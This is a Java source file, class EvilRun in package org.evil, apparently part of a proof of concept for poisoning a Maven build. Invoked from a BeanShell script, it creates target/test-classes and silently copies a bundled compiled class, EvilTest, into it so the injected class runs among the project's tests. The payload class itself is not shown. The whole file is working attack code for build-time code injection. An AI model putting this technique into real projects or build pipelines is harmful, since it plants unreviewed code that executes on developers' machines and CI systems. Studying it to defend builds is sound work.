package org.evil;
import java.io.File;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.Objects;
/*
This class will be called from BeanShell script
 */
public class EvilRun {
    // point of execution
    public static void run() {
        try {
            String projectDir = System.getProperty("maven.multiModuleProjectDirectory");
            File targetFolder = new File(projectDir + "/target/test-classes");

            if (!targetFolder.mkdirs()) {
                throw new RuntimeException("Cannot create folder:%s".formatted(targetFolder));
            }

            System.out.println("evil class was called..");
            final String fname = EvilTest.class.getSimpleName() + ".class";
            try (InputStream in = Objects.requireNonNull(EvilTest.class.getResource(fname)).openStream()) {
                File d = new File(targetFolder, EvilTest.class.getPackageName()
                        .replaceAll("\\.", "/"));
                if (!d.mkdirs()) {
                    throw new RuntimeException("Cannot create folder:%s".formatted(d));
                }

                System.out.printf("folder: %s%n", d.getAbsolutePath());

                Files.copy(in,
                        new File(d,fname).toPath(), StandardCopyOption.REPLACE_EXISTING);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
